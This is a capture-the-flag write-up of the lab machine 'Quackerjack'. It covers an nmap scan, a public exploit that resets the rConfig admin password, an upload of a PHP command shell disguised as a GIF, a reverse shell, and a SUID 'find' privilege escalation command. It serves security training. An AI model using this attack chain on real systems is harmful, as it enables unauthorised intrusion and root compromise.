#### Enumeration

##### Nmap 

```
nmap -Pn -p- -sC -sV -T4 -oN Quackerjack.nmap 192.168.102.57
```

```
# Nmap 7.91 scan initiated Thu Jul  1 08:10:12 2021 as: nmap -Pn -p- -sC -sV -T4 -oN Quackerjack.nmap 192.168.102.57
Nmap scan report for 192.168.102.57
Host is up (0.22s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
8081/tcp open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=quackerjack/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2020-06-22T19:28:25
|_Not valid after:  2021-06-22T19:28:25
|_ssl-date: TLS randomness does not represent time
Service Info: Host: QUACKERJACK; OS: Unix
```

On port 8081 website runs rConfig 3.9.4.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h30m56s_006_.png)

First use this [exploit](https://www.exploit-db.com/exploits/48878) to change admin's password to `Testing1@`. [Reference](https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff)

Edit source code 48878.py at line 21 `url` variable.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h47m37s_008_.png)

Execute 48878.py to change password.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h46m34s_007_.png)

Now we can login admin account with password `Testing1@`.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h53m30s_009_.png)

Switch to vendors page directly.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h54m11s_010_.png)

Upload any php cmd shell. But before click the save button to launch burp suite first. We need to edit upload file's content-type to `image/gif`.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h56m48s_012_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h57m40s_013_.png)

Php cmd file has been successfully uploaded.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h59m34s_014_.png)

Connect to page `https://192.168.102.57:8081/images/vendor/cmd.php`. Execute reverse shell command.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.02_00h00m40s_015_.png)

Get a connect back shell.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.02_00h02m17s_016_.png)


#### Privilege Escalation

execute linpeas.sh.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h17m45s_001_.png)

GTFOBins

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h26m43s_005_.png)

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Quackerjack/Quackerjack_2021.07.01_23h21m38s_003_.png)

